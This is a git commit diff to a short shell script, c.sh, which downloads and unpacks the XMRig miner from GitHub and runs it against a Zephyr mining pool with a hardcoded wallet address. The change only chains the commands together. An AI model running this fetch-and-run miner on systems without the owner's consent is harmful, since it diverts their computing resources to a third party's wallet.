4033b1064c9bcec2b2234cc29ed1eee44c9ac0a9
rompvmrix <159663581+rompvmrix@users.noreply.github.com>
2024-02-22 17:17:45 +0600

    Update c.sh

--- c.sh
+++ c.sh
@@ -1,4 +1,4 @@
 
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-bionic-x64.tar.gz
-tar -xvf xmrig-6.21.0-bionic-x64.tar.gz
-./xmrig --donate-level 1 -o de.zephyr.herominers.com:1124 -u ZEPHYR2YT2UNKVcQQqnCXh9k57L8xyyzS8kCht1oVuSvGRucDEMMPfoGQYvFCcKNCNBdmPLXrXM3zi8Xr3kdoLasV3xULi54Mtg33 -p YOUR_WORKER_NAME -a rx/0 -k
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-bionic-x64.tar.gz &&
+tar -xvf xmrig-6.21.0-bionic-x64.tar.gz && cd xmrig-6.21.0 &&
+ ./xmrig --donate-level 1 -o de.zephyr.herominers.com:1124 -u ZEPHYR2YT2UNKVcQQqnCXh9k57L8xyyzS8kCht1oVuSvGRucDEMMPfoGQYvFCcKNCNBdmPLXrXM3zi8Xr3kdoLasV3xULi54Mtg33 -p YOUR_WORKER_NAME -a rx/0 -k
